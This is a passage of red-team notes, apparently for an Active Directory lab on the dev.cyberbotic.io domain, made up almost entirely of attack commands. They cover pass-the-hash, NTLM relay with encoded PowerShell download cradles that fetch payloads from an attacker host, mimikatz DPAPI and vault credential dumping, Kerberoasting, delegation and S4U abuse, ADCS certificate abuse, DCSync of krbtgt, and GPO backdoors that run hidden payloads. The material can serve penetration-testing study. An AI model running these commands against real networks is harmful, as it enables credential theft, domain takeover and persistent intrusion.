    <rich_text family="monospace" scale="h3" weight="heavy"># Use Proxifier for Windows environment </rich_text>
    <rich_text scale="h3" weight="heavy">
ps&gt; runas /netonly /user:dev/bfarmer mmc.exe
ps&gt; mimikatz # privilege::debug
ps&gt; mimikatz # sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe
PS C:\Users\Attacker&gt; $cred = Get-Credential
PS C:\Users\Attacker&gt; Get-ADComputer -Server 10.10.122.10 -Filter * -Credential $cred | select

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Use FoxyProxy plugin to access Webportal via SOCKS Proxy
</rich_text>
    <rich_text scale="h3" weight="heavy">
</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Reverse Port Forward (if teamserver is not directly accessible, then use rportfwd to redirect traffic)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; rportfwd 8080 127.0.0.1 80
beacon&gt; run netstat -anp tcp
ps&gt; iwr -Uri </rich_text>
    <rich_text link="webs http://wkstn-2:8080/a" scale="h3" weight="heavy">http://wkstn-2:8080/a</rich_text>
    <rich_text scale="h3" weight="heavy">

beacon&gt; powershell New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
beacon&gt; powershell Remove-NetFirewallRule -DisplayName "Test Rule"

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># NTLM Relay</rich_text>
    <rich_text scale="h3" weight="heavy">
</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">
1. Setup SOCKS Proxy on the beacon</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">2. Setup Proxychains to use this proxy</rich_text>
    <rich_text scale="h3" weight="heavy">
$ sudo vim /etc/proxychains.conf
socks5 127.0.0.1 1080 socks_user socks_password

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">3. Use Proxychain to send NTLMRelay traffic to beacon targeting DC and encoded SMB Payload for execution</rich_text>
    <rich_text scale="h3" weight="heavy">
$ sudo proxychains ntlmrelayx.py -t smb://10.10.122.10 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA='

# iex (new-object net.webclient).downloadstring("</rich_text>
    <rich_text link="webs http://10.10.123.102:8080/b" scale="h3" weight="heavy">http://10.10.123.102:8080/b</rich_text>
    <rich_text scale="h3" weight="heavy">")

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">4. Setup reverse port forwarding </rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; rportfwd 8080 127.0.0.1 80
beacon&gt; rportfwd 8445 127.0.0.1 445

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">5. Upload PortBender driver and load its .cna file</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; cd C:\Windows\system32\drivers
beacon&gt; upload C:\Tools\PortBender\WinDivert64.sys
beacon&gt; PortBender redirect 445 8445

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">6. Manually try to access share on our system or use MSPRN, Printspooler to force authentication</rich_text>
    <rich_text scale="h3" weight="heavy">

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">7. Verify the access in weblog and use link command to connect with SMB beacon</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; link dc-2.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
</rich_text>
  </node>
  <node name="Data Protection API" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697291703" ts_lastsave="1697291876">
    <rich_text weight="heavy">
</rich_text>
    <rich_text scale="h3" weight="heavy">
</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Use mimikatz to dump secrets from windows vault</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; mimikatz !vault::list
beacon&gt; mimikatz !vault::cred /patch

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Part 1: Enumerate stored credentials</rich_text>
    <rich_text scale="h3" weight="heavy">

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">0. Check if system has credentials stored in either web or windows vault</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; run vaultcmd /list
beacon&gt; run vaultcmd /listcreds:"Windows Credentials" /all
beacon&gt; run vaultcmd /listcreds:"Web Credentials" /all
beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Part 2.1: Scheduled Task Credentials</rich_text>
    <rich_text scale="h3" weight="heavy">

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">1. Credentials for task scheduler are stored at below location in encrypted blob</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">2. Find the GUID of Master key associated with encrypted blob (F31...B6E)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">3. Dump all the master keys and filter the one we need based on GUID identified in previous step</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; mimikatz !sekurlsa::dpapi

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">4. Use the Encrypted Blob and Master Key to decrypt and extract plain text password</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Part 2.2: Extracting stored RDP Password </rich_text>
    <rich_text scale="h3" weight="heavy">

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">1. Enumerate the location of encrypted credentials blob (Returns ID of Enc blob and GUID of Master Key)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">2. Verify the credential blob in users cred directory (Note enc blob ID)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">3. Master key is stored in users Protect directory (Note GUID of master key matching with Seatbelt)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">4. Decrypt the master key (Need to be execute in context of user who owns the key, use @ modifier)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; mimikatz !sekurlsa::dpapi
beacon&gt; mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">5. Use Master key to decrypt the credentials blob</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
</rich_text>
    <rich_text>
</rich_text>
  </node>
  <node name="Kerberos attacks" unique_id="30" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697291901" ts_lastsave="1697292210">
    <rich_text weight="heavy">
</rich_text>
    <rich_text scale="h3" weight="heavy">
</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Kerberosting</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&amp;(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap

ps&gt; hashcat -a 0 -m 13100 hashes wordlist

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># ASREPRoast</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&amp;(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap

ps&gt; hashcat -a 0 -m 18200 svc_oracle wordlist

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Unconstrained Delegation (Caches TGT of any user accessing its service)</rich_text>
    <rich_text scale="h3" weight="heavy">

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">1. Identify the computer objects having Unconstrained Delegation enabled</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">2. Dumping the cached TGT ticket (requires system access on affected system)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; getuid
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">3. Execute PrintSpool attack to force DC to authenticate with WEB </rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">4. Use Machine TGT (DC) fetched to gain RCE on itself using S4U abuse (/self flag)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">5. Inject the ticket and access the service</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

beacon&gt; steal_token 2664
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$


</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Constrained Delegation (allows to request TGS for any user using its TGT)</rich_text>
    <rich_text scale="h3" weight="heavy">

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">1. Identify the computer objects having Constrained Delegation is enabled</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&amp;(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">2. Dump the TGT of User/Computer Account having constrained Delegation enabled (use asktgt if NTLM hash)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; getuid
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">3. Use S4U technique to request TGS for delegated service using machines TGT (Use S4U2Proxy tkt)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">4. OR, Access other alternate Service not stated in Delegation attribute (ldap)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">5. Inject the S4U2Proxy tkt from previous step</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">6. Access the services </rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; steal_token 5540
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$
beacon&gt; dcsync dev.cyberbotic.io DEV\krbtgt


</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Resource-Based Constrained Delegation (Systems having writable msDS-AllowedToActOnBehalfOfOtherIdentity)</rich_text>
    <rich_text scale="h3" weight="heavy">

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">1. Identify the Computer Objects which has AllowedToActOnBehalfOfOtherIdentity attribute defined</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&amp;(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" --attributes dnshostname,samaccountname,msDS-AllowedToActOnBehalfOfOtherIdentity --json

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">2. OR, Identify the Domain Computer where we can write this atribute with custom value </rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

beacon&gt; powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">3. Next we will assign delegation rights to our computer by modifying the attribute of target system</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Get-DomainComputer -Identity wkstn-2 -Properties objectSid
beacon&gt; powerpick $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">4. Verify the updated attribute</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">5. Get the TGT of our computer</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">6. Use S4U technique to get TGS for target computer using our TGT</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">7. Access the services</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=

beacon&gt; steal_token 4092
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">8 Remove the delegation rights</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">OR, Create Fake computer Account for RBCD Attack</rich_text>
    <rich_text scale="h3" weight="heavy">

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">9. Check if we have permission to create computer account (default allowed)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">10. Create a fake computer with random password (generate hash using Rubeus)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
PS&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">11. Use the Hash to get TGT for our fake computer, and rest of the steps remains same</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
</rich_text>
  </node>
  <node name="Active Directory Certificate Services" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697292210" ts_lastsave="1697292257">
    <rich_text weight="heavy">
</rich_text>
    <rich_text scale="h3" weight="heavy"># Finding Certificate Authorities
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas

# Miconfigured Certificate template
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable

# Attack Case 1: _ENROLLEE_SUPPLIES_SUBJECT_

beacon&gt; getuid
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb

ubuntu@DESKTOP-3BSK7NO ~&gt; openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

ubuntu@DESKTOP-3BSK7NO ~&gt; cat cert.pfx | base64 -w 0

beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:pass123 /nowrap


# Attack Case 2 : NTLMRelay on CA web endpoint

# NTLM Relaying to ADCS HTTP Endpoints
- Web End point for certificate services is at http[s]://&lt;hostname&gt;/certsrv.
- Redirect the NTLM auth traffic using PrintSpool attack from DC to CA (if services running on seperate system) to fetch the DC Certificate
- But if they are both running on same server then we can execute the attack targetting a system where unconstrained delegation (WEB) is allowed, and force it to authenticate with CA to capture its certificate
- Do the same setup for ntlmrelayx and use print spooler to force DC/WEB to authenticate with wkstn2


1. Setup socks proxy (beacon session)
beacon&gt; socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging

2. Setup Proxychains to use this proxy
$ sudo vim /etc/proxychains.conf
socks5 127.0.0.1 1080 socks_user socks_password

3. Execute NTLMRelayx to target the certificate server endpoint
attacker@ubuntu ~&gt; sudo proxychains ntlmrelayx.py -t </rich_text>
    <rich_text link="webs https://10.10.122.10/certsrv/certfnsh.asp" scale="h3" weight="heavy">https://10.10.122.10/certsrv/certfnsh.asp</rich_text>
    <rich_text scale="h3" weight="heavy"> -smb2support --adcs --no-http-server

4. Setup reverse port forwarding (System shell)
beacon&gt; rportfwd 8445 127.0.0.1 445

5. Upload PortBender driver and load its cna file (System shell)
beacon&gt; cd C:\Windows\system32\drivers
beacon&gt; upload C:\Tools\PortBender\WinDivert64.sys
beacon&gt; PortBender redirect 445 8445

6. Use PrintSpool attack to force WEB (unconstrained) server to authenticate with wkstn 2 (Domain Sesion)
beacon&gt; execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102

7. Use the Base64 encoded machine certificate obtained to get TGT of machine account
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /nowrap

8. Use the TGT ticket obtained for S4U attack to get a service ticket
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

9. Inject the Service Ticket by creating a new sacrificial token
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

10. Steal token and access the service
beacon&gt; steal_token 1234
beacon&gt; ls \\web.dev.cyberbotic.io\c$


## User and Computer Persistance

# User Persistance

1. Enumerate user certificate from their Personal Certificate store (execute from user session)
beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates

2. Export the certificate as DER and PFX file on disk
beacon&gt; mimikatz crypto::certificates /export

3. Encode the PFX file to be used with Rubeus
ubuntu@DESKTOP-3BSK7NO ~&gt; cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0

4. Use certificate to request TGT for the user (/enctype:aes256 - Better OPSEC)
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIINeg[...]IH0A== /password:mimikatz /enctype:aes256 /nowrap

5. if certificate is not present then requst from his loggedin session and then follow above steps
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User

# Computer Persistance 

1. Export the machine certificate (requires elevated session)
beacon&gt; mimikatz !crypto::certificates /systemstore:local_machine /export

2. Encode the certificate, and use it to get TGT for machine account
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIINCA[...]IH0A== /password:mimikatz /nowrap

3. If machine certificate it not stored, we can requet it using Certify (/machine param is required for auto elevation to system privilege)
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:Machine /machine
</rich_text>
  </node>
  <node name="Group Policy" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697292257" ts_lastsave="1697292295">
    <rich_text weight="heavy">
</rich_text>
    <rich_text scale="h3" weight="heavy"># Modify Existing GPO

1. Identify GPO where current principal has modify rights
beacon&gt; powerpick Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

2. Resolve GPOName, Path and SID of principal
beacon&gt; powerpick Get-DomainGPO -Identity "CN={AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath

beacon&gt; powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

beacon&gt; ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}

3. Identify the domain OU where the above GPO applies
beacon&gt; powerpick Get-DomainOU -GPLink "{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}" | select distinguishedName

4. Identify the systems under the given OU
beacon&gt; powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

5. Setup a pivot listener(1234) on the beacon, and download &amp; execute cradle pointing to pivot (80)
PS&gt; IEX ((new-object net.webclient).downloadstring("</rich_text>
    <rich_text link="webs http://wkstn-2:8080/pivot" scale="h3" weight="heavy">http://wkstn-2:8080/pivot</rich_text>
    <rich_text scale="h3" weight="heavy">"))


6. Enable inbound traffic on Pivot Listener (1234) and WebDrive by ports (8080) (requires system access)
beacon&gt; powerpick New-NetFirewallRule -DisplayName "Rule 1" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 1234
beacon&gt; powerpick New-NetFirewallRule -DisplayName "Rule 2" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080

7. Setup port forwarding rule to accept the Payload Download request locally and forward to our team server 
beacon&gt; rportfwd 8080 127.0.0.1 80

8. Use sharpGPOAbuse to add the backdoor (scheduled task) for execution on targetted system
beacon&gt; execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "C:\Windows\System32\cmd.exe" --Arguments "/c powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyADoAOAAwADgAMAAvAHAAaQB2AG8AdAAiACkAKQA=" --GPOName "Vulnerable GPO"


# Create and Link new GPO

1. Check the rights to create a new GPO in Domain
beacon&gt; powerpick Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }

2. Find the OU where any principal has "Write gPlink Privilege"
beacon&gt; powerpick Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl

beacon&gt; powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers

3. Verify if RSAT module is installed for GPO abuse
beacon&gt; powerpick Get-Module -List -Name GroupPolicy | select -expand ExportedCommands

4. Create a new GPO &amp; configure it to execute attacker binary via Registry loaded from shared location
beacon&gt; powerpick New-GPO -Name "Evil GPO"

beacon&gt; powerpick Find-DomainShare -CheckShareAccess
beacon&gt; cd \\dc-2\software
beacon&gt; upload C:\Payloads\pivot.exe
beacon&gt; powerpick Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\pivot.exe" -Type ExpandString

5. Link newly created GPO with OU
beacon&gt; powerpick Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
</rich_text>
  </node>
